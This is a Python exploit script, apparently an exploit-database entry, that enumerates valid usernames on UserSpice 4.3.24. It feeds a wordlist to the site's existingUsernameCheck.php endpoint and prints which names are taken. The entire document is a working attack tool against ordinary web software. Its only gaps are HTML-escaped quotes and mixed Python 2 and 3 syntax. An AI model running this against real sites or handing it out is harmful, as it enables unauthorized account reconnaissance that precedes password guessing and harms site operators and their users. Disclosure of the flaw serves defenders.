# Author: Dolev Farhi
# Vendor or Software Link: www.userspice.com
# Version: 4.3.24
# Tested on: Ubuntu
 
import sys
import os.path
import requests
 
print("[+] UserSpice 4.3.24 Username Enumeration")
 
if len(sys.argv) != 3:
    print &#039;Usage:&#039;, sys.argv[0], &#039;ip.add.re.ss&#039;, &#039;usernames.txt&#039;
    sys.exit(1)
 
if not os.path.exists(sys.argv[2]):
    print(&#039;usernames.txt does not exist&#039;)
    sys.exit(1)
 
headers = {
    &#039;Origin&#039;:&#039;http://&#039; + sys.argv[1],
    &#039;X-Requested-With&#039;:&#039;XMLHttpRequest&#039;
}
 
print(&#039;Checking usernames...&#039;)
 
f = open(sys.argv[2], &#039;r&#039;)
 
for user in f:
    user = user.strip()
    req = requests.post(&#039;http://&#039;+sys.argv[1]+&#039;/users/parsers/existingUsernameCheck.php&#039;, headers=headers ,
                                                                                          data={"username":user})
    if &#039;taken&#039; in req.text:
        print(&#039;[FOUND] &#039; + user)
    else:
        print(&#039;[NOT FOUND] &#039; + user)

